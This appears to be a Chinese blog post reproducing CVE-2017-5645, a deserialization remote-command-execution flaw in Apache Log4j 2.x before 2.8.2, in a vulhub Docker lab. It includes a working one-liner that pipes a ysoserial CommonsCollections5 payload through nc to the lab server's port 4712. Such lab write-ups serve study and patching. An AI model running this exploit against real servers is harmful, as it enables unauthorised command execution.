# Apache Log4j Server CVE-2017-5645 反序列化命令执行漏洞 - Bin_Go - 博客园

> 原文：[`www.cnblogs.com/Bin-go/p/17722374.html`](https://www.cnblogs.com/Bin-go/p/17722374.html)

漏洞描述

攻击者可以通过发送一个特别制作的 2 进制 payload，在组件将字节反序列化为对象时，触发并执行构造的 payload 代码。该漏洞主要是由于在处理 ObjectInputStream 时，接收函数对于不可靠来源的 input 没有过滤。可以通过给 TcpSocketServer 和 UdpSocketServer 添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞
影响版本

```
Apache Log4j 2.8.2 之前的 2.x 版本
```

环境搭建

```
cd /vulhub/log4j/CVE-2017-5645 docker-compose up -d
```

复现

```
使用 ysoserial 生成 payload，然后直接发送给 192.168.1.144:4712 端口即可。
java -jar ysoserial-master.jar CommonsCollections5 "touch /tmp/testsuccess" | nc 192.168.1.144 4712 进入容器发现生成文件成功
docker exec -it [容器 id] /bin/bash 
```

![](img/9b9df2c327a2d168b10be155d36a8bad.png)

![](img/556fad93ac915ff70e868f9c6c1a5fdd.png)